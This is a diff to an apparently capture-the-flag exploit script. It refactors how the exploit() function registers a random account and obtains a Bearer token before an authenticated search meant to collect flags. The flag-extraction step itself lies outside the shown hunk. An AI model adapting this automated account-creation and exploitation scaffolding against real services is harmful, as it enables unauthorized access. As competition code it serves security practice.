@@ -41,21 +41,24 @@ def _rand(n=12):
     )
 
 
+def _token(s, base, u, p, path):
+    try:
+        return s.post(base + path, json={"username": u, "password": p},
+                      timeout=TIMEOUT).json().get("token")
+    except (ValueError, requests.RequestException):
+        return None
+
+
 def exploit(host, port, flag_id):
-    base = "http://%s:%d" % (host, port)
     flags = []
     seen = set()
     try:
+        base = "http://%s:%s" % (host, port)      # %s: a non-int port returns [] instead of raising
         s = requests.Session()
         u, p = _rand(), _rand(16)
-        # register + login to obtain a Bearer token for the authenticated search.
-        s.post(base + "/api/register", json={"username": u, "password": p}, timeout=TIMEOUT)
-        r = s.post(base + "/api/login", json={"username": u, "password": p}, timeout=TIMEOUT)
-        token = None
-        try:
-            token = r.json().get("token")
-        except ValueError:
-            token = None
+        # /api/register already returns a usable token; only fall back to /api/login
+        # if it doesn't (saves one sequential round-trip per job).
+        token = _token(s, base, u, p, "/api/register") or _token(s, base, u, p, "/api/login")
         if not token:
             return flags
         headers = {"Authorization": "Bearer " + token}
